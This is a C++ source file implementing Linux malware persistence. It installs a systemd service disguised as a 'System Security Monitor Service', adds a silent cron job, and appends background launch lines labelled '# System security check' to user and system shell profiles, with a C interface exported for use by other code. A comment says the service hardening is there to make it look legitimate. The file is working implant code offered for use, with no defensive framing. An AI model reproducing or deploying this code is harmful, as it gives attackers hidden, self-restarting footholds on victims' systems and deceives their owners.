#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#include <cstring>
#include <filesystem>

class LinuxSystemdPersistence {
private:
    std::string serviceName;
    std::string serviceDescription;
    std::string executablePath;
    std::string workingDirectory;
    std::string userName;
    bool isUserMode;
    
    std::string getUserHome() {
        const char* home = getenv("HOME");
        if (home) {
            return std::string(home);
        }
        
        struct passwd* pw = getpwuid(getuid());
        if (pw && pw->pw_dir) {
            return std::string(pw->pw_dir);
        }
        
        return "/tmp";  // fallback
    }
    
    std::string getSystemdUserDir() {
        std::string home = getUserHome();
        std::string systemdDir = home + "/.config/systemd/user";
        
        // Create directory if it doesn't exist
        std::filesystem::create_directories(systemdDir);
        return systemdDir;
    }
    
    std::string getSystemdSystemDir() {
        return "/etc/systemd/system";
    }
    
public:
    LinuxSystemdPersistence(const std::string& name, const std::string& execPath) 
        : serviceName(name), executablePath(execPath), isUserMode(getuid() != 0) {
        
        serviceDescription = "System Security Monitor Service";
        workingDirectory = std::filesystem::path(execPath).parent_path();
        userName = "root";
        
        // Use user mode if not running as root
        if (isUserMode) {
            struct passwd* pw = getpwuid(getuid());
            userName = pw ? pw->pw_name : "user";
        }
    }
    
    bool installService() {
        std::string serviceContent = generateServiceContent();
        std::string servicePath = getServicePath();
        
        // Write service file
        std::ofstream serviceFile(servicePath);
        if (!serviceFile.is_open()) {
            std::cerr << "Failed to create service file: " << servicePath << std::endl;
            return false;
        }
        
        serviceFile << serviceContent;
        serviceFile.close();
        
        // Set proper permissions
        chmod(servicePath.c_str(), 0644);
        
        // Reload systemd and enable service
        return reloadAndEnableService();
    }
    
    bool removeService() {
        // Stop and disable service
        std::string stopCmd = "systemctl " + (isUserMode ? "--user " : "") + "stop " + serviceName + ".service 2>/dev/null";
        std::string disableCmd = "systemctl " + (isUserMode ? "--user " : "") + "disable " + serviceName + ".service 2>/dev/null";
        
        system(stopCmd.c_str());
        system(disableCmd.c_str());
        
        // Remove service file
        std::string servicePath = getServicePath();
        std::filesystem::remove(servicePath);
        
        // Reload systemd
        std::string reloadCmd = "systemctl " + (isUserMode ? "--user " : "") + "daemon-reload";
        system(reloadCmd.c_str());
        
        return true;
    }
    
    bool isServiceInstalled() {
        std::string servicePath = getServicePath();
        return std::filesystem::exists(servicePath);
    }
    
    bool isServiceRunning() {
        std::string checkCmd = "systemctl " + (isUserMode ? "--user " : "") + 
                              "is-active " + serviceName + ".service >/dev/null 2>&1";
        return system(checkCmd.c_str()) == 0;
    }
    
private:
    std::string getServicePath() {
        if (isUserMode) {
            return getSystemdUserDir() + "/" + serviceName + ".service";
        } else {
            return getSystemdSystemDir() + "/" + serviceName + ".service";
        }
    }
    
    std::string generateServiceContent() {
        std::string content = "[Unit]\n";
        content += "Description=" + serviceDescription + "\n";
        content += "After=network.target\n";
        content += "Wants=network.target\n";
        content += "StartLimitIntervalSec=0\n\n";
        
        content += "[Service]\n";
        content += "Type=simple\n";
        content += "ExecStart=" + executablePath + "\n";
        content += "WorkingDirectory=" + workingDirectory + "\n";
        content += "Restart=always\n";
        content += "RestartSec=10\n";
        content += "StandardOutput=null\n";
        content += "StandardError=null\n";
        content += "SyslogIdentifier=" + serviceName + "\n";
        
        if (!isUserMode) {
            content += "User=" + userName + "\n";
            content += "Group=" + userName + "\n";
        }
        
        // Security hardening (makes service look legitimate)
        content += "NoNewPrivileges=true\n";
        content += "PrivateTmp=true\n";
        content += "ProtectHome=true\n";
        content += "ProtectSystem=strict\n";
        content += "ReadWritePaths=/var/log /tmp\n\n";
        
        content += "[Install]\n";
        if (isUserMode) {
            content += "WantedBy=default.target\n";
        } else {
            content += "WantedBy=multi-user.target\n";
        }
        
        return content;
    }
    
    bool reloadAndEnableService() {
        // Reload systemd daemon
        std::string reloadCmd = "systemctl " + (isUserMode ? "--user " : "") + "daemon-reload";
        if (system(reloadCmd.c_str()) != 0) {
            std::cerr << "Failed to reload systemd daemon" << std::endl;
            return false;
        }
        
        // Enable service
        std::string enableCmd = "systemctl " + (isUserMode ? "--user " : "") + 
                               "enable " + serviceName + ".service 2>/dev/null";
        system(enableCmd.c_str());
        
        // Start service
        std::string startCmd = "systemctl " + (isUserMode ? "--user " : "") + 
                              "start " + serviceName + ".service 2>/dev/null";
        system(startCmd.c_str());
        
        return true;
    }
};

// Cron-based persistence for systems without systemd
class LinuxCronPersistence {
private:
    std::string executablePath;
    std::string cronEntry;
    
public:
    LinuxCronPersistence(const std::string& execPath) : executablePath(execPath) {
        // Run every 5 minutes, suppress output
        cronEntry = "*/5 * * * * " + execPath + " >/dev/null 2>&1";
    }
    
    bool installCronJob() {
        // Get current crontab
        std::string getCronCmd = "crontab -l 2>/dev/null";
        FILE* pipe = popen(getCronCmd.c_str(), "r");
        
        std::string currentCrontab;
        if (pipe) {
            char buffer[128];
            while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                currentCrontab += buffer;
            }
            pclose(pipe);
        }
        
        // Check if our entry already exists
        if (currentCrontab.find(executablePath) != std::string::npos) {
            return true;  // Already installed
        }
        
        // Add our entry
        currentCrontab += cronEntry + "\n";
        
        // Write new crontab
        std::string tempFile = "/tmp/crontab_" + std::to_string(getpid());
        std::ofstream temp(tempFile);
        temp << currentCrontab;
        temp.close();
        
        std::string installCmd = "crontab " + tempFile + " 2>/dev/null";
        bool result = system(installCmd.c_str()) == 0;
        
        // Cleanup
        std::filesystem::remove(tempFile);
        
        return result;
    }
    
    bool removeCronJob() {
        // Get current crontab
        std::string getCronCmd = "crontab -l 2>/dev/null";
        FILE* pipe = popen(getCronCmd.c_str(), "r");
        
        std::string currentCrontab;
        if (pipe) {
            char buffer[128];
            while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                std::string line(buffer);
                // Skip lines containing our executable
                if (line.find(executablePath) == std::string::npos) {
                    currentCrontab += line;
                }
            }
            pclose(pipe);
        }
        
        // Write cleaned crontab
        std::string tempFile = "/tmp/crontab_clean_" + std::to_string(getpid());
        std::ofstream temp(tempFile);
        temp << currentCrontab;
        temp.close();
        
        std::string installCmd = "crontab " + tempFile + " 2>/dev/null";
        bool result = system(installCmd.c_str()) == 0;
        
        // Cleanup
        std::filesystem::remove(tempFile);
        
        return result;
    }
};

// Shell profile persistence (bashrc, zshrc, etc.)
class LinuxShellPersistence {
private:
    std::string executablePath;
    std::string profileLine;
    
    std::vector<std::string> getShellProfiles() {
        std::string home = getenv("HOME") ? getenv("HOME") : "/tmp";
        return {
            home + "/.bashrc",
            home + "/.zshrc", 
            home + "/.profile",
            home + "/.bash_profile",
            "/etc/bash.bashrc",
            "/etc/profile"
        };
    }
    
public:
    LinuxShellPersistence(const std::string& execPath) : executablePath(execPath) {
        // Hidden execution in background
        profileLine = "\n# System security check\n" + execPath + " >/dev/null 2>&1 &\n";
    }
    
    bool installShellHooks() {
        bool installed = false;
        
        for (const auto& profile : getShellProfiles()) {
            if (std::filesystem::exists(profile) && access(profile.c_str(), W_OK) == 0) {
                // Check if already installed
                std::ifstream file(profile);
                std::string content((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
                file.close();
                
                if (content.find(executablePath) == std::string::npos) {
                    // Append our hook
                    std::ofstream outFile(profile, std::ios::app);
                    outFile << profileLine;
                    outFile.close();
                    installed = true;
                }
            }
        }
        
        return installed;
    }
    
    bool removeShellHooks() {
        bool removed = false;
        
        for (const auto& profile : getShellProfiles()) {
            if (std::filesystem::exists(profile) && access(profile.c_str(), W_OK) == 0) {
                std::ifstream file(profile);
                std::string content;
                std::string line;
                
                while (std::getline(file, line)) {
                    // Skip lines containing our executable
                    if (line.find(executablePath) == std::string::npos) {
                        content += line + "\n";
                    } else {
                        removed = true;
                    }
                }
                file.close();
                
                if (removed) {
                    std::ofstream outFile(profile);
                    outFile << content;
                    outFile.close();
                }
            }
        }
        
        return removed;
    }
};

// Main persistence manager
class LinuxPersistenceManager {
private:
    std::string executablePath;
    LinuxSystemdPersistence systemdPersistence;
    LinuxCronPersistence cronPersistence;
    LinuxShellPersistence shellPersistence;
    
public:
    LinuxPersistenceManager(const std::string& execPath, const std::string& serviceName = "security-monitor") 
        : executablePath(execPath), 
          systemdPersistence(serviceName, execPath),
          cronPersistence(execPath),
          shellPersistence(execPath) {}
    
    bool installAllMethods() {
        bool success = false;
        
        // Try systemd first (most reliable)
        if (systemdPersistence.installService()) {
            std::cout << "[+] Systemd service persistence installed" << std::endl;
            success = true;
        }
        
        // Install cron backup
        if (cronPersistence.installCronJob()) {
            std::cout << "[+] Cron job persistence installed" << std::endl;
            success = true;
        }
        
        // Install shell hooks
        if (shellPersistence.installShellHooks()) {
            std::cout << "[+] Shell profile persistence installed" << std::endl;
            success = true;
        }
        
        return success;
    }
    
    bool removeAllMethods() {
        bool success = true;
        
        success &= systemdPersistence.removeService();
        success &= cronPersistence.removeCronJob();
        success &= shellPersistence.removeShellHooks();
        
        return success;
    }
    
    bool checkPersistence() {
        return systemdPersistence.isServiceInstalled() || 
               systemdPersistence.isServiceRunning();
    }
};

// C interface for external use
extern "C" {
    int install_linux_persistence(const char* executable_path, const char* service_name) {
        try {
            LinuxPersistenceManager manager(executable_path, service_name ? service_name : "security-monitor");
            return manager.installAllMethods() ? 1 : 0;
        } catch (...) {
            return 0;
        }
    }
    
    int remove_linux_persistence(const char* executable_path, const char* service_name) {
        try {
            LinuxPersistenceManager manager(executable_path, service_name ? service_name : "security-monitor");
            return manager.removeAllMethods() ? 1 : 0;
        } catch (...) {
            return 0;
        }
    }
    
    int check_linux_persistence(const char* executable_path, const char* service_name) {
        try {
            LinuxPersistenceManager manager(executable_path, service_name ? service_name : "security-monitor");
            return manager.checkPersistence() ? 1 : 0;
        } catch (...) {
            return 0;
        }
    }
}